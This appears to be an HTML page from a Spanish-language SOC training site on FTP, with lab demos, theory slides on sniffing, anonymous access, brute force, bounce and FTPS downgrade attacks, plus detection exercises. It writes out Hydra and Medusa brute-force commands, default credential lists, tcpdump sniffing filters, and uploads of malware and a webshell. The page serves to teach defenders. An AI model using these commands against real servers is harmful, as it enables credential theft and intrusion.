@@ -1,0 +1,1078 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FTP — Protocolos SOC</title>
+  <meta name="description" content="FTP: transferencia de archivos, credenciales en claro, FTP Bounce, Anonymous FTP, detección en SOC." />
+  <link rel="stylesheet" href="../styles.css" />
+  <link rel="stylesheet" href="../boton-dubstep.css" />
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml" />
+  <style> :root { --proto-color: #ffcc00; } </style>
+  <script>
+    (function(){
+      const t = localStorage.getItem('protocolos-soc-theme') || 'vision-ui';
+      document.documentElement.setAttribute('data-theme', t);
+    })();
+  </script>
+</head>
+<body class="page-wrapper">
+
+  <header class="site-header">
+    <div class="container">
+      <a href="../index.html" class="site-logo">
+        <span class="logo-icon">🛡️</span>
+        <span>Protocolos<span class="accent">SOC</span></span>
+      </a>
+      <nav class="header-nav">
+        <a href="https://github.com/xavimape/protocolos-red-soc" target="_blank" rel="noopener" data-i18n="nav.github">GitHub</a>
+      </nav>
+      <div class="ui-controls">
+        <a href="../index.html" class="back-to-hub">
+          <span class="back-arrow">←</span>
+          <span data-i18n="nav.back">Volver al Hub</span>
+        </a>
+        <select class="theme-select" id="theme-select" title="Cambiar tema"></select>
+        <button class="ctrl-btn" id="lang-toggle" title="Switch to English" onclick="i18n.toggleLang()">EN</button>
+      </div>
+    </div>
+  </header>
+
+  <div class="module-header">
+    <div class="container">
+      <div class="module-breadcrumb">
+        <a href="../index.html">Hub</a>
+        <span class="sep">›</span>
+        <span>FTP</span>
+      </div>
+      <div class="module-title-row">
+        <div class="module-number-badge">7</div>
+        <div>
+          <div class="module-title">FTP</div>
+          <div class="module-subtitle" data-i18n="ftp.subtitle">File Transfer Protocol · TCP/21,20 · Capa de Aplicación</div>
+        </div>
+      </div>
+      <nav class="tabs-nav">
+        <button class="tab-btn active" data-tab="demo"       onclick="SOC.switchTab('ftp','demo')">       <span data-i18n="tab.demo">🧪 Demo Lab</span></button>
+        <button class="tab-btn"        data-tab="teoria"     onclick="SOC.switchTab('ftp','teoria')">     <span data-i18n="tab.teoria">📖 Teoría</span></button>
+        <button class="tab-btn"        data-tab="ejercicios" onclick="SOC.switchTab('ftp','ejercicios')"> <span data-i18n="tab.ejercicios">✏️ Ejercicios</span></button>
+        <button class="tab-btn"        data-tab="recursos"   onclick="SOC.switchTab('ftp','recursos')">   <span data-i18n="tab.recursos">📚 Recursos</span></button>
+      </nav>
+    </div>
+  </div>
+
+  <main class="container">
+
+    <!-- ── Tab: Demo Lab ── -->
+    <div class="tab-content active" data-tab="demo">
+
+      <!-- Demo 1: Sesión FTP con credenciales en claro -->
+      <div class="demo-container">
+        <div class="demo-panel">
+          <div class="demo-panel-header">
+            <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+            <span class="panel-title" data-i18n="ftp.demo.session.title">Sesión FTP — Credenciales en texto claro</span>
+            <span class="badge badge-info">TCP/21</span>
+          </div>
+          <div class="demo-panel-body">
+            <div class="demo-input-group">
+              <label data-i18n="ftp.demo.session.server">Servidor FTP:</label>
+              <input type="text" id="ftp-server" value="ftp.empresa.com" />
+            </div>
+            <div class="demo-input-group">
+              <label data-i18n="ftp.demo.session.user">Usuario:</label>
+              <input type="text" id="ftp-user" value="jperez" />
+            </div>
+            <div class="demo-input-group">
+              <label data-i18n="ftp.demo.session.pass">Contraseña:</label>
+              <input type="text" id="ftp-pass" value="P@ssw0rd123" />
+            </div>
+            <div class="demo-input-group">
+              <label data-i18n="ftp.demo.session.mode">Modo de transferencia:</label>
+              <select id="ftp-mode">
+                <option value="active">Active Mode (PORT)</option>
+                <option value="passive" selected>Passive Mode (PASV)</option>
+              </select>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="ftpDemo.runSession()" data-i18n="ftp.demo.btn.session">▶ Simular sesión FTP</button>
+              <button class="btn btn-secondary" onclick="ftpDemo.reset()" data-i18n="btn.reset">↺ Reset</button>
+            </div>
+          </div>
+        </div>
+        <div class="demo-panel">
+          <div class="demo-panel-header">
+            <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+            <span class="panel-title" data-i18n="ftp.demo.session.output">Captura de sesión FTP</span>
+          </div>
+          <div class="demo-panel-body">
+            <div class="demo-output" id="ftp-output">
+              <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="ftp.demo.waiting">Esperando simulación FTP...</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 2: Anonymous FTP -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="ftp.demo.anon.title">🔓 Demo: Anonymous FTP — Acceso sin credenciales</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="ftp.demo.anon.desc">
+          Muchos servidores FTP permiten acceso anónimo (usuario "anonymous", contraseña = email). Si el servidor tiene permisos de escritura anónima, el atacante puede depositar archivos maliciosos o usar el servidor como relay.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="ftp.demo.anon.panel">Configurar análisis</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="ftp.demo.anon.target">IP / host objetivo:</label>
+                <input type="text" id="anon-target" value="192.168.1.20" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="ftp.demo.anon.perm">Permisos anónimos:</label>
+                <select id="anon-perm">
+                  <option value="ro" data-i18n="ftp.opt1">Solo lectura (read-only)</option>
+                  <option value="rw" selected data-i18n="ftp.opt2">Lectura y escritura (rw) — peligroso</option>
+                  <option value="none" data-i18n="ftp.opt3">Sin acceso anónimo</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="ftpDemo.runAnon()" data-i18n="ftp.demo.btn.anon">▶ Simular acceso anónimo</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="ftp.demo.anon.result">Resultado del acceso</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="anon-output" style="min-height:180px;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="ftp.demo.waiting">Esperando simulación FTP...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 3: FTP Bounce / Brute Force -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="ftp.demo.attack.title">⚔️ Demo: FTP Brute Force + Reconocimiento</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="ftp.demo.attack.desc">
+          FTP es un objetivo habitual de ataques de fuerza bruta: credenciales en claro en la red + muchos servidores FTP con contraseñas débiles o predeterminadas. El reconocimiento del banner revela versión y OS del servidor.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="ftp.demo.attack.panel">Configurar ataque</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="ftp.demo.attack.target">Objetivo:</label>
+                <input type="text" id="bf-target" value="192.168.1.20" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="ftp.demo.attack.type">Tipo de ataque:</label>
+                <select id="bf-type">
+                  <option value="banner" data-i18n="ftp.opt4">Banner grabbing — reconocimiento de versión</option>
+                  <option value="brute" selected>Brute force — wordlist (Hydra)</option>
+                  <option value="default" data-i18n="ftp.opt5">Credenciales por defecto</option>
+                  <option value="bounce">FTP Bounce Attack (PORT scan)</option>
+                  <option value="sniff" data-i18n="ftp.opt6">Sniffing de credenciales en claro</option>
+                  <option value="mitm">Downgrade FTP / MitM (FTPS → FTP)</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="ftpDemo.runAttack()" data-i18n="ftp.demo.btn.attack">▶ Ejecutar</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="ftp.demo.attack.result">Resultado</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="bf-output" style="min-height:180px;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="ftp.demo.waiting">Esperando simulación FTP...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /tab demo -->
+
+    <!-- ── Tab: Teoría ── -->
+    <div class="tab-content" data-tab="teoria">
+      <div class="slides-container" id="ftp-slides">
+
+        <div class="slide active">
+          <span class="slide-number">1 / 9</span>
+          <h2 data-i18n="ftp.s1.title">¿Qué es FTP?</h2>
+          <p class="slide-subtitle" data-i18n="ftp.s1.sub">El protocolo de transferencia de archivos más antiguo y peligroso</p>
+          <p data-i18n="ftp.s1.p1">FTP (File Transfer Protocol) es uno de los protocolos más antiguos de Internet (RFC 959, 1985). Permite transferir archivos entre cliente y servidor, pero tiene un problema fundamental: <strong>todo viaja en texto claro</strong> — credenciales, comandos y datos.</p>
+          <div class="callout danger">
+            <strong data-i18n="ftp.s1.risk.title">Riesgo crítico desde el diseño:</strong>
+            <ul style="margin-top:0.5rem;">
+              <li data-i18n="ftp.s1.r1">🔑 <strong>Credenciales en claro</strong> — usuario y contraseña legibles con Wireshark/Zeek</li>
+              <li data-i18n="ftp.s1.r2">📄 <strong>Datos en claro</strong> — archivos transferidos sin cifrado</li>
+              <li data-i18n="ftp.s1.r3">🔌 <strong>Dos canales TCP</strong> — control (21) y datos (20 o dinámico) — complica firewalls</li>
+              <li data-i18n="ftp.s1.r4">👤 <strong>Anonymous FTP</strong> — acceso sin autenticación real</li>
+            </ul>
+          </div>
+          <p style="font-size:0.85rem;color:var(--text-secondary);" data-i18n="ftp.s1.alt">Alternativas seguras: SFTP (SSH File Transfer Protocol, TCP/22) · FTPS (FTP over TLS, TCP/990) · SCP</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">2 / 9</span>
+          <h2 data-i18n="ftp.s2.title">Arquitectura de dos canales</h2>
+          <p class="slide-subtitle" data-i18n="ftp.s2.sub">Canal de control + Canal de datos — el origen de muchas complicaciones</p>
+          <pre data-i18n="ftp.pre0">
+ACTIVE MODE (PORT):
+  Cliente (random port) ──── TCP/21 ────► Servidor  ← canal de control
+  Cliente (random port) ◄─── TCP/20 ──── Servidor  ← datos (servidor conecta)
+  ⚠ El servidor inicia la conexión de datos → firewalls bloquean esto
+
+PASSIVE MODE (PASV):
+  Cliente (random port) ──── TCP/21 ────► Servidor  ← control
+  Cliente → "PASV"
+  Servidor → "227 Entering Passive Mode (192,168,1,20,195,213)"
+             Puerto datos = 195×256 + 213 = 50133
+  Cliente (random port) ──── TCP/50133 ─► Servidor  ← datos (cliente conecta)
+  ✓ Más compatible con firewalls (cliente siempre inicia)
+
+COMANDOS FTP (todos en texto claro por TCP/21):
+  USER jperez         → envía usuario
+  PASS P@ssw0rd123    → envía contraseña EN CLARO ⚠
+  LIST                → listar directorio
+  RETR archivo.txt    → descargar archivo
+  STOR payload.exe    → subir archivo
+  PORT h1,h2,h3,h4,p1,p2  → active mode
+  PASV                → passive mode
+  QUIT                → cerrar sesión</pre>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">3 / 9</span>
+          <h2 data-i18n="ftp.s3.title">Ataque 1: Sniffing de credenciales FTP</h2>
+          <p class="slide-subtitle" data-i18n="ftp.s3.sub">Captura trivial con cualquier sniffer</p>
+          <p data-i18n="ftp.s3.p1">Cualquier atacante con acceso a la red (MitM, mismo segmento, WiFi) puede capturar credenciales FTP con Wireshark, tcpdump o Zeek. No requiere ninguna habilidad especial.</p>
+          <pre data-i18n="ftp.pre1">
+# Wireshark — filtro para FTP
+ftp                         → todo el tráfico FTP
+ftp.request.command == "USER"   → solo usernames
+ftp.request.command == "PASS"   → solo contraseñas (en claro!)
+
+# tcpdump — capturar credenciales
+tcpdump -i eth0 -A 'tcp port 21' | grep -E "USER|PASS"
+
+# Zeek ftp.log — automático
+ts=10:05:01  user=jperez  password=P@ssw0rd123  command=USER/PASS
+             ↑ Zeek registra credenciales FTP automáticamente
+
+CAPTURA DE DATOS:
+  tcpdump -i eth0 -A 'tcp port 20 or tcp port 50000:60000'
+  → Captura el contenido de los archivos transferidos
+
+PELIGRO: si jperez usa la misma contraseña en otros sistemas
+  → Un sniff de FTP → comprometido en AD, email, VPN...</pre>
+          <div class="callout danger" data-i18n="ftp.s3.callout">
+            <strong>Caso real:</strong> muchas organizaciones todavía usan FTP interno para transferir backups, configs o reportes. En un pentest interno, el primer paso es a menudo escuchar TCP/21 en el segmento más activo.
+          </div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">4 / 9</span>
+          <h2 data-i18n="ftp.s4.title">Ataque 2: Anonymous FTP</h2>
+          <p class="slide-subtitle" data-i18n="ftp.s4.sub">Acceso público sin autenticación</p>
+          <p data-i18n="ftp.s4.p1">FTP permite configurar acceso anónimo donde cualquier usuario puede conectarse con usuario <code>anonymous</code> y cualquier string como contraseña (convencionalmente, su email). El riesgo depende de los permisos configurados.</p>
+          <pre data-i18n="ftp.pre2">
+ACCESO ANÓNIMO SOLO LECTURA — riesgo moderado:
+  ftp 192.168.1.20
+  Name: anonymous
+  Password: hacker@example.com
+  230 Login successful
+  ftp> ls
+  → Puede listar y descargar archivos públicos
+  → RIESGO: exposición accidental de información sensible
+    (backups, configs, datos de clientes)
+
+ACCESO ANÓNIMO LECTURA/ESCRITURA — riesgo crítico:
+  ftp> put malware.exe /incoming/malware.exe   ← sube payload
+  ftp> put backdoor.php /pub/backdoor.php      ← webshell si hay web
+  → FTP Bounce: usar el server como relay para scan/ataque a otros hosts
+  → Depósito de contenido ilegal (CP, malware para hospedar)
+
+DETECCIÓN:
+  Zeek ftp.log: user="anonymous"  → siempre alertar en redes internas
+  Si hay uploads anónimos → crítico inmediato</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">MITRE ATT&CK: <strong>T1133</strong> — External Remote Services · <strong>T1105</strong> — Ingress Tool Transfer</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">5 / 9</span>
+          <h2 data-i18n="ftp.s5.title">Ataque 3: FTP Brute Force</h2>
+          <p class="slide-subtitle" data-i18n="ftp.s5.sub">Ataques de diccionario contra credenciales FTP</p>
+          <p data-i18n="ftp.s5.p1">FTP generalmente no tiene rate limiting ni bloqueo de cuentas por defecto. Los atacantes pueden probar miles de contraseñas automáticamente con herramientas como Hydra o Medusa.</p>
+          <pre data-i18n="ftp.pre3">
+# Hydra — brute force FTP
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+      192.168.1.20 ftp -t 4
+
+# Medusa
+medusa -h 192.168.1.20 -u ftpuser -P passwords.txt -M ftp
+
+CREDENCIALES POR DEFECTO COMUNES:
+  admin:admin      anonymous:         ftp:ftp
+  root:toor        test:test          user:password
+  admin:password   ftpuser:ftpuser    backup:backup
+
+DETECCIÓN en Zeek ftp.log:
+  Muchos intentos de login fallidos desde misma IP:
+  ts=10:10:01  src=192.168.1.99  user=admin  reply_code=530 ×50
+  ts=10:10:15  src=192.168.1.99  user=admin  reply_code=230 ← éxito!
+
+CÓDIGOS DE RESPUESTA FTP CLAVE:
+  220 — Banner del servidor (¡revela versión!)
+  230 — Login exitoso
+  530 — Login incorrecto
+  550 — Acción no permitida
+  425 — No se puede abrir conexión de datos (active mode bloqueado)</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">MITRE ATT&CK: <strong>T1110.001</strong> — Brute Force: Password Guessing</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">6 / 9</span>
+          <h2 data-i18n="ftp.s6.title">Ataque 4: FTP Bounce (PORT attack)</h2>
+          <p class="slide-subtitle" data-i18n="ftp.s6.sub">Usar el servidor FTP como proxy de ataque</p>
+          <p data-i18n="ftp.s6.p1">En active mode, el cliente le dice al servidor FTP a qué IP y puerto conectarse para transferir datos (comando PORT). Un atacante puede especificar una IP/puerto de terceros — el servidor FTP actúa como proxy.</p>
+          <pre data-i18n="ftp.pre4">
+FLUJO DEL ATAQUE:
+  Atacante (1.2.3.4)                FTP Server (ftp.empresa.com)
+       │                                    │
+       │── PORT 10,0,0,5,0,22 ────────────►│  "Conectate a 10.0.0.5:22"
+       │── RETR archivo.txt ───────────────►│
+       │                                    │── TCP connect → 10.0.0.5:22
+       │                                    │   El servidor FTP escanea/ataca
+       │                                    │   un host interno en nombre del atacante
+
+USOS MALICIOSOS:
+  1. Port scan interno: enviar PORT con cada puerto del target
+     → El servidor FTP sondea hosts que el atacante no puede alcanzar directamente
+  2. Bypass de firewall: el FTP server puede llegar a 10.0.0.0/8 (interno)
+     pero el atacante no puede desde Internet
+  3. Anonimización: el ataque parece venir del servidor FTP, no del atacante
+
+MITIGACIÓN: la mayoría de servidores FTP modernos bloquean
+PORT commands que apuntan a IPs distintas del cliente (RFC 2577)</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);" data-i18n="ftp.s.cvehist">CVE histórico: implementaciones antiguas de wu-ftpd, ProFTPD</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">7 / 9</span>
+          <h2 data-i18n="ftp.s7.title">FTP en telemetría SOC</h2>
+          <p class="slide-subtitle" data-i18n="ftp.s7.sub">Zeek ftp.log — el log que captura credenciales automáticamente</p>
+          <pre data-i18n="ftp.pre5">
+# Zeek ftp.log — campos principales
+ts        uid  id.orig_h       id.resp_h    user       password         command  reply_code
+10:05:01  X1   192.168.1.50    192.168.1.20  jperez     P@ssw0rd123      PASS     230
+10:05:02  X1   192.168.1.50    192.168.1.20  -          -                LIST     226
+10:05:05  X1   192.168.1.50    192.168.1.20  -          -                RETR     226  config.bak
+
+# ⚠ Zeek captura CONTRASEÑAS FTP EN CLARO — tratarlo como datos sensibles
+
+# IOC 1: Brute force — muchos 530 desde misma IP
+ts=10:10:XX  src=192.168.1.99  user=admin  reply_code=530 × 200 en 60s
+ts=10:12:00  src=192.168.1.99  user=admin  reply_code=230 ← compromiso
+
+# IOC 2: Anonymous FTP con escritura
+ts=10:15:00  user=anonymous  command=STOR  arg=malware.exe  reply_code=226
+
+# IOC 3: Descarga de archivos sensibles
+ts=10:20:00  user=ftpbackup  command=RETR  arg=db_backup_2024.sql
+→ ¿Es normal que ftpbackup descargue backups a las 10pm desde IP externa?
+
+# Sigma — FTP Brute Force
+title: FTP Brute Force Detection
+detection:
+  selection:
+    proto: ftp
+    reply_code: 530
+  condition: selection | count() by id.orig_h > 20
+  timeframe: 60s
+level: medium</pre>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">8 / 9</span>
+          <h2 data-i18n="ftp.s8.title">Migración a alternativas seguras</h2>
+          <p class="slide-subtitle" data-i18n="ftp.s8.sub">Por qué deshabilitar FTP y qué usar en su lugar</p>
+          <ul>
+            <li>🚫 <strong data-i18n="ftp.s8.m1">Deshabilitar FTP si no es necesario</strong> — eliminar el servicio es la mejor defensa</li>
+            <li>🔐 <strong data-i18n="ftp.s8.m2">Migrar a SFTP</strong> — SSH File Transfer Protocol, cifrado completo, TCP/22, mismas credenciales SSH</li>
+            <li>🔒 <strong data-i18n="ftp.s8.m3">Migrar a FTPS</strong> — FTP over TLS, cifra credenciales y datos, TCP/990 (implicit) o 21 con STARTTLS</li>
+            <li>📋 <strong data-i18n="ftp.s8.m4">Si FTP es requerido</strong>: IP allowlist estricta, credenciales únicas (no reutilizar), audit logs, sin anonymous</li>
+            <li>🌐 <strong data-i18n="ftp.s8.m5">Nunca FTP sobre Internet</strong> — toda la sesión es capturada por cualquier nodo intermedio</li>
+            <li>📊 <strong data-i18n="ftp.s8.m6">Alertar siempre sobre FTP desde Internet</strong> — si FTP/21 tiene conexiones externas, es un IOC inmediato</li>
+          </ul>
+          <div class="cheatsheet-table-wrap" style="margin-top:1rem;">
+            <table class="cheatsheet-table">
+              <thead><tr><th data-i18n="ftp.s8.compare">Protocolo</th><th data-i18n="ftp.s8.cred">Credenciales</th><th data-i18n="ftp.s8.data">Datos</th><th data-i18n="ftp.s8.port">Puerto</th></tr></thead>
+              <tbody>
+                <tr><td>FTP</td><td>❌ Claro</td><td>❌ Claro</td><td>21/20</td></tr>
+                <tr><td>FTPS</td><td>✅ TLS</td><td>✅ TLS</td><td>990 / 21+STARTTLS</td></tr>
+                <tr><td>SFTP</td><td>✅ SSH</td><td>✅ SSH</td><td>22</td></tr>
+                <tr><td>SCP</td><td>✅ SSH</td><td>✅ SSH</td><td>22</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">9 / 9</span>
+          <h2 data-i18n="ftp.s9.title">Ataque 5: FTPS Downgrade / MitM</h2>
+          <p class="slide-subtitle" data-i18n="ftp.s9.sub">Forzar a un cliente FTPS a conectarse sin TLS</p>
+          <p data-i18n="ftp.s9.p1">FTPS (FTP + TLS) es opcional por diseño en su modo explícito (AUTH TLS). Un atacante MitM puede interceptar el handshake y responder con error, haciendo que un cliente mal configurado reconecte en texto claro.</p>
+          <pre data-i18n="ftp.pre6">
+FTPS EXPLÍCITO (AUTH TLS) vs IMPLÍCITO (FTPS en puerto 990):
+
+Modo EXPLÍCITO (puerto 21 — el más común, el vulnerable):
+  Cliente → "AUTH TLS"
+  Si MitM bloquea/modifica → "500 Unknown command"
+  Cliente mal configurado → retrocede a FTP plano
+  → Credenciales capturadas en texto claro
+
+Modo IMPLÍCITO (puerto 990 — más seguro):
+  TLS se negocia ANTES de cualquier comando FTP
+  Sin TLS: el servidor cierra la conexión
+  → No hay posibilidad de downgrade
+
+ESCENARIO DE ATAQUE MitM:
+  1. ARP poisoning: cliente FTP → [atacante] → servidor FTP
+  2. Atacante intercepta "AUTH TLS"
+  3. Responde "500 Unknown command"
+  4. Cliente (FileZilla, WinSCP mal conf.) reintenta sin TLS
+  5. USER jdoe / PASS P@ssw0rd → visibles al atacante
+
+HERRAMIENTAS:
+  ettercap, bettercap, mitmproxy (con plugin FTP)
+
+DETECCIÓN:
+  Zeek: conexiones FTP a servidores que normalmente usan FTPS
+  SIEM: alerta si "AUTH TLS" NO aparece en sesión FTP a host conocido FTPS
+
+MITIGACIÓN:
+  1. Usar FTPS implícito (puerto 990) — no permite downgrade
+  2. Configurar cliente: "Require TLS" sin fallback a FTP plano
+  3. Mejor: migrar a SFTP (SSH) — protocolo distinto, sin riesgo de downgrade
+  4. MFA + certificate pinning en clientes FTP corporativos</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">MITRE ATT&CK: <strong>T1557</strong> — Adversary-in-the-Middle · <strong>T1040</strong> — Network Sniffing</p>
+        </div>
+
+      </div><!-- /slides-container -->
+      <div class="slides-nav">
+        <button class="btn btn-secondary btn-prev" disabled data-i18n="btn.prev">← Anterior</button>
+        <div class="slides-progress"></div>
+        <button class="btn btn-primary btn-next" data-i18n="btn.next">Siguiente →</button>
+      </div>
+    </div><!-- /tab teoria -->
+
+    <!-- ── Tab: Ejercicios ── -->
+    <div class="tab-content" data-tab="ejercicios">
+      <div class="ejercicios-list">
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-01</span>
+            <span class="ejercicio-title" data-i18n="ftp.ej1.title">Identificar el modo FTP en el tráfico</span>
+            <span class="ejercicio-difficulty dif-easy" data-i18n="ej.easy">Fácil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="ftp.ej1.q">Analizá estos dos extractos de Wireshark. Determiná si cada uno corresponde a active mode o passive mode, y explicá cómo lo sabés:</p>
+            <pre data-i18n="ftp.pre7">
+Extracto A:
+  192.168.1.50:54321 → 192.168.1.20:21  [PSH] "PORT 192,168,1,50,212,34"
+  192.168.1.20:20    → 192.168.1.50:54370  [SYN]  ← nueva conexión TCP
+
+Extracto B:
+  192.168.1.50:54321 → 192.168.1.20:21  [PSH] "PASV"
+  192.168.1.20:21    → 192.168.1.50:54321 [PSH] "227 Entering Passive Mode (192,168,1,20,196,145)"
+  192.168.1.50:54322 → 192.168.1.20:50321 [SYN]  ← nueva conexión TCP</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+EXTRACTO A: ACTIVE MODE (PORT)
+
+Evidencias:
+→ El cliente envía el comando PORT con su IP y puerto
+  "PORT 192,168,1,50,212,34"
+  Puerto de datos = 212×256 + 34 = 54306
+→ El SERVIDOR (192.168.1.20) inicia la conexión de datos desde el puerto 20
+  "192.168.1.20:20 → 192.168.1.50:54370 [SYN]"
+  El servidor CONECTA al cliente — eso es active mode
+
+PROBLEMA con active mode:
+→ Si el cliente está detrás de un NAT o firewall, la conexión del servidor
+  al cliente será bloqueada (el firewall no tiene estado de esa conexión)
+→ Por eso active mode es cada vez menos usado
+
+EXTRACTO B: PASSIVE MODE (PASV)
+
+Evidencias:
+→ El cliente envía el comando "PASV"
+→ El servidor responde: "227 Entering Passive Mode (192,168,1,20,196,145)"
+  Puerto de datos = 196×256 + 145 = 50321
+→ El CLIENTE inicia la nueva conexión TCP de datos al servidor:
+  "192.168.1.50:54322 → 192.168.1.20:50321 [SYN]"
+  El cliente CONECTA al servidor — eso es passive mode
+
+VENTAJA de passive mode:
+→ El cliente siempre inicia → compatible con NAT y firewalls
+→ El servidor debe abrir un rango de puertos "pasivos" en el firewall
+→ Es el modo estándar hoy en día
+
+CLAVE PARA DISTINGUIRLOS:
+  Active:  servidor conecta al cliente (desde :20)
+  Passive: cliente conecta al servidor (al puerto negociado en PASV)
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-02</span>
+            <span class="ejercicio-title" data-i18n="ftp.ej2.title">Analizar Zeek ftp.log — ¿qué robó el atacante?</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="ftp.ej2.q">Analizá este extracto de Zeek ftp.log de las últimas 24 horas. Identificá todos los IOCs, qué datos pueden haber sido comprometidos y qué acciones tomás:</p>
+            <pre>
+ts          orig_h          resp_h         user         password      command  arg                reply_code
+08:00:01    10.0.0.50       10.0.0.20      ftpbackup    Backup2024!   PASS     -                  230
+08:00:02    10.0.0.50       10.0.0.20      -            -             RETR     monthly_report.xlsx 226
+08:00:05    10.0.0.50       10.0.0.20      -            -             QUIT     -                  221
+...
+22:15:33    203.0.113.99    10.0.0.20      ftpbackup    Backup2024!   PASS     -                  230  ← !
+22:15:35    203.0.113.99    10.0.0.20      -            -             LIST     -                  226
+22:15:40    203.0.113.99    10.0.0.20      -            -             RETR     monthly_report.xlsx 226
+22:15:42    203.0.113.99    10.0.0.20      -            -             RETR     db_dump_full.sql    226
+22:15:55    203.0.113.99    10.0.0.20      -            -             RETR     employee_data.csv   226
+22:16:10    203.0.113.99    10.0.0.20      -            -             STOR     backdoor.php        226
+22:16:15    203.0.113.99    10.0.0.20      -            -             QUIT     -                  221</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+IOCs IDENTIFICADOS:
+
+1. CREDENCIALES EN CLARO:
+   Las credenciales ftpbackup/Backup2024! son visibles en el log de Zeek.
+   Zeek las captura automáticamente del tráfico FTP en texto claro.
+   → La contraseña Backup2024! está comprometida y expuesta.
+
+2. ACCESO EXTERNO CON CREDENCIALES LEGÍTIMAS:
+   08:00:01 — acceso legítimo desde 10.0.0.50 (IP interna)
+   22:15:33 — MISMO usuario (ftpbackup) desde 203.0.113.99 (IP EXTERNA)
+   → Misma contraseña en claro → el atacante la capturó del sniffing de las 08:00
+   → O la obtuvo por otro medio (breach, phishing, reutilización de contraseña)
+
+3. EXFILTRACIÓN DE DATOS (3 archivos descargados):
+   monthly_report.xlsx → reporte mensual (datos financieros/operativos)
+   db_dump_full.sql    → VOLCADO COMPLETO DE BASE DE DATOS ← crítico
+   employee_data.csv   → datos de empleados (PII — privacidad/compliance)
+
+4. PERSISTENCIA — WEBSHELL SUBIDA:
+   STOR backdoor.php → subió un archivo PHP al servidor FTP
+   Si el directorio FTP es accesible desde la web (ej: /var/www/html/ftp/)
+   → backdoor.php es una webshell → acceso HTTP permanente al servidor
+   → El atacante vuelve sin necesitar FTP
+
+ACCIONES INMEDIATAS:
+  1. Bloquear 203.0.113.99 en firewall
+  2. Deshabilitar cuenta ftpbackup / cambiar contraseña
+  3. Localizar y eliminar backdoor.php del servidor
+     find /var/ftp /var/www -name "backdoor.php" -delete
+  4. Determinar si backdoor.php fue accedida vía HTTP (revisar access.log)
+  5. INCIDENTE DE DATOS: db_dump_full.sql + employee_data.csv exfiltrados
+     → Notificación de breach puede ser requerida (GDPR/LGPD/HIPAA según contexto)
+  6. Rotar: contraseña FTP + contraseña de DB + credenciales en el dump
+  7. Migrar FTP → SFTP y remover FTP del acceso externo
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-03</span>
+            <span class="ejercicio-title" data-i18n="ftp.ej3.title">FTP vs SFTP vs FTPS — ¿cuándo usar cada uno?</span>
+            <span class="ejercicio-difficulty dif-easy" data-i18n="ej.easy">Fácil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="ftp.ej3.q">Para cada escenario, recomendá el protocolo correcto (FTP, SFTP, FTPS o SCP) y justificá tu elección:</p>
+            <ol style="margin-left:1.2rem;line-height:2.2;">
+              <li data-i18n="ftp.ej3.s1">Transferencia de backups nocturnos entre dos servidores Linux en la misma red interna</li>
